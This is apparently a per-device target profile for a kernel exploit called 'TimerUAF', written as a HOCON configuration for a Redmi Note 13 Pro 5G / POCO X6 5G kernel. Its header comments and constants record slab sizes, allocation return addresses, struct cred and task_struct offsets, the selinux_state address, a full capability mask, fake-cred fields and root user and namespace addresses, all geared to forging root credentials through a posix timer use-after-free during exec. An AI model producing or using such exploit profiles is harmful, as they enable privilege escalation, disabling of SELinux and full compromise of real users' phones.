# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Redmi Note 13 Pro 5G / POCO X6 5G (garnet)
# Build : OS3.0.306.0.WNRCNXM (HyperOS 3.0, China, Android 16)
# Kernel: 5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284 (4K pages)
#
# Second 5.10 (android12) member of the family, and like the S23 FE port the
# layout differs from 5.15/6.x in ways the constants below record:
#
#   - struct cred is 0xa8 with a 4-byte atomic usage, but 5.10 has no
#     cred->ucounts yet: group_info occupies +0x90 and non_rcu/rcu the
#     +0x98 union.  There is no init_ucounts symbol (only inc_ucount(),
#     ucounts_hashtable), so cred_ucounts_off is pinned to 0x90 and
#     init_ucounts points at ucounts_hashtable, which is only ever written,
#     never dereferenced.
#   - task_struct is 0x1280 (fork_init literal; no vendor extension, no
#     arch_task_struct_size symbol) with task->cred at +0x780.
#   - do_timer_create passes 0xdc0 to kmem_cache_alloc (GFP_KERNEL_ACCOUNT
#     without the zeroing flag), same as other 5.10 builds.
#   - This kernel has no BTF, so every geometry constant below comes from
#     disassembly and static data.
#
# Every constant is derived from that factory boot.img:
#   boot.img     sha256 0fe533929789903ca515d83d980a5d10b0db89a9ff0813915f84d256a190b6c4
#   Image        sha256 42c827b562da776539da12ef90e7755495b1ebd33fe16d6257e299a0530fb801
#   vmlinux.elf  sha256 f4be89910ede670ff5677e580f4baeab5f4c1747567a6d286aaebe19c43965ba
#   (no btf.bin: the image ships no BTF section)
#
#   init_posix_timers   kmem_cache_create_usercopy("posix_timers_cache", 0x108,
#                       ..., SLAB_ACCOUNT) at 0xffffffc00a49b504 (the
#                       __initstub__kmod_posix_timers__333_280 cfi body),
#                       storing the cache at [0xa9b9000+0x5f0]
#                       -> timer_alloc 0x108
#   do_timer_create     ldr x0, [posix_timers_cache @ 0xffffffc00a9b95f0];
#                       bl kmem_cache_alloc at 0xffffffc00827bcfc, returns to
#                       0xffffffc00827bd00
#   copy_process (bl dup_task_struct at 0xffffffc008123b7c) -> dup_task_struct
#                       loads task_struct_cachep @ 0xffffffc00a990180 and
#                       calls bl kmem_cache_alloc at 0xffffffc008126744,
#                       returning to 0xffffffc008126748 -> low21 0x126748
#                       (5.10 has no kmem_cache_alloc_node here)
#   fork_init           kmem_cache_create_usercopy("task_struct", 0x1280, 64,
#                       SLAB_PANIC|SLAB_ACCOUNT) at 0xffffffc00a493284 ->
#                       task_alloc_bytes 0x1280
#   cred_init           kmem_cache_create_usercopy("cred_jar", 0xa8, ...,
#                       SLAB_HWCACHE_ALIGN|PANIC|ACCOUNT) -> object 0xc0
#   cred layout from init_cred static data (0xffffffc00a7b0a60) +
#                       prepare_creds/put_cred_rcu disassembly: usage 0x0
#                       (4 bytes), uid 0x4, gid 0x8, suid 0xc, sgid 0x10,
#                       euid 0x14, egid 0x18, fsuid 0x1c, fsgid 0x20,
#                       securebits 0x24, caps 0x28..0x48 (5 words),
#                       keyring 0x58..0x70, security 0x78, user 0x80,
#                       user_ns 0x88, group_info 0x90, non_rcu/rcu 0x98,
#                       size 0xa8; task->cred 0x780 from __arm64_sys_getuid
#                       (ldr x8, [x8, #0x780]; ldr w8, [x8, #0x4]) and
#                       __arm64_sys_geteuid (+0x14).
#   k_itimer 0x108 with the timerqueue node at +0x78 (posix_cpu_timer_del
#                       uses add x22, x20, #0x78).
#
# Vulnerability: fs/exec.c begin_new_exec() (0xffffffc00855572c) still calls
#   exec_mmap (0xffffffc008555fe4) -> posix_cpu_timers_exit
#   (0xffffffc008556040 -> 0xffffffc00827ff14) -> exit_itimers
#   (0xffffffc008556078 -> 0xffffffc00827f0fc), the vulnerable order.

release = "5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284"
schema_version = 1
ksu_kmi = "android12-5.10"

page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# 5.10 frees the order-1 slab through the PCP lists, which emit no
# mm_page_free event, so the reclaim is gated on /proc/slabinfo instead.
pcp_free = 1
alloc_req_off = 0x10

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) return address.
timer_site = 0xffffffc00827bd00
timer_alloc = 0x108
timer_node_off = 0x78

# cred_jar: sizeof(struct cred)=0xa8, HWCACHE_ALIGN bytes_alloc=0xc0.
cred_req = 0xa8
cred_alloc = 0xc0
cred_size = 0xa8
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
# 5.10 cred has no ucounts field: pin the ucounts write onto the groups slot
# (see header).  init_ucounts below points at ucounts_hashtable.
cred_ucounts_off = 0x90
cred_group_off = 0x90
fake_cred_off = 0x18

# Link-time symbols (kallsyms).
selinux_state = 0xffffffc00aa42b90
panic_on_warn = 0xffffffc00a789dc0

# task_struct / cred layout (disassembly; this kernel has no BTF).
task_cred_off = 0x780
copy_process_low21 = 0x126748
task_alloc_bytes = 0x1280

# Capability and fake-cred refcounted sub-objects.
fullcap = 0x1ffffffffff
root_user = 0xffffffc00a7af5e0
init_user_ns = 0xffffffc00a7af678
# Not a real init_ucounts (this kernel has none): ucounts_hashtable, only
# written into the overwritten slot, never dereferenced.
init_ucounts = 0xffffffc00a990ff8
init_groups = 0xffffffc00a7b0b08

# task_security_struct: the LSM registry (__start_lsm_info 0xffffffc00a753cd8,
# __end_lsm_info 0xffffffc00a753d68) lists capability, selinux and integrity,
# and capability/integrity register no cred blob, so SELinux sits at 0.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
